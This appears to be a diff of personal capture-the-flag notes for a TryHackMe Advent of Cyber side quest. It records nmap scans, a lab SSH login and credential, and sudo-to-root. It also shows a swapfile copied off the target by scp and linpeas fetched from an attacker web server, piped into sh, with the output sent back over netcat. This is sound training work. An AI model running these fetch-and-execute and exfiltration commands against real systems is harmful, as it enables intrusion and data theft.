@@ -125,21 +125,119 @@ cat flag.txt
 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 
 
-// Remote Box (Side Quest 2)
+
+
+### BONUS ###
+
+2025-12-29 16:09:33 EST -- 
+-----------------------
+# Starting on new day to find this egg
+ip=10.64.183.228
+
+// *SideQuest 2 EggKey* //
 <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
-2025-12-20 11:41:42 EST -- 
-sudo su -
 
-//Found a swapfile under /
+// nmap --
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
 
-file /swapfile
-swapfile: Linux swap file, 4k page size, little endian, version 1, size 262143 pages, 0 bad pages, no label, UUID=0d9ef519-3337-4859-b573-61e0ea49aae4
+// SCAN
+ports=$(nmap -Pn -p- --min-rate=1000 -T4 $ip | grep '^[0-9]' | cut -d '/' -f 1 | paste -sd ',' -)
 
-scp /swapfile kali@192.168.190.148:~/haxterm/data/Day09
+echo $ports
+//22,80,5901
 
-NEED MORE WORK FOR THIS
+sudo nmap -Pn -A -p$ports $ip -oN tcp.nmap
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 09:d2:3e:1d:22:31:b8:61:cb:e6:aa:23:69:20:bd:a7 (ECDSA)
+|_  256 d6:32:6e:37:53:97:b2:53:9c:45:ed:44:c2:47:27:79 (ED25519)
+80/tcp   open  http    WebSockify Python/3.12.3
+|_http-title: Error response
+|_http-server-header: WebSockify Python/3.12.3
+5901/tcp open  vnc     VNC (protocol 3.8)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
+No OS matches for host
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+# UDP scan
+sudo nmap -Pn -sU --top-ports 100 $ip -oN udp.nmap
+
+PORT      STATE         SERVICE
+68/udp    open|filtered dhcpc
+5353/udp  open|filtered zeroconf
+10000/udp open|filtered ndmp
+49154/udp open|filtered unknown
+49188/udp open|filtered unknown
+65024/udp open|filtered unknown
 
 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+//ubuntu:AOC2025Ubuntu!
+
+ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" ubuntu@$ip
+
+sudo -l
+Matching Defaults entries for ubuntu on tryhackme:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
+
+User ubuntu may run the following commands on tryhackme:
+    (ALL : ALL) ALL
+    (ALL) NOPASSWD: ALL
+	(ALL) NOPASSWD: ALL
+
+sudo su -
+
+//NOTE: The last egg image was named sq1.png, lets see if I can find somthing similar
+
+find / -type f -iname "sq*.png" 2>/dev/null
+//Nothing of interest
+
+//Found a weird location for a swapfile in /
+scp swapfile kali@192.168.190.148:/home/kali/haxterm/data/Day09
+
+
+// Privesc -- Linux
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+# Local network
+// Install peass
+sudo apt install -y peass
+cp /usr/share/peass/linpeas/linpeas.sh .
+
+
+// Download, execute from memory, & save output on kali
+  // KALI term1
+sudo python3 -m http.server 80
+  // KALI term2
+nc -lvnp 443 | tee linpeas_ubuntu.out
+
+  // CurlTarget for ubuntu
+curl 192.168.190.148:80/linpeas.sh | sh | nc 192.168.190.148 443
+
+sudo su -
+
+## Now with root
+nc -lvnp 443 | tee linpeas_root.out
+  // CurlTarget for root
+curl 192.168.190.148:80/linpeas.sh | sh | nc 192.168.190.148 443
+
+
+// View linpeas output
+less -R linpeas_ubuntu.out
+less -R linpeas_root.out
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
 
 
 
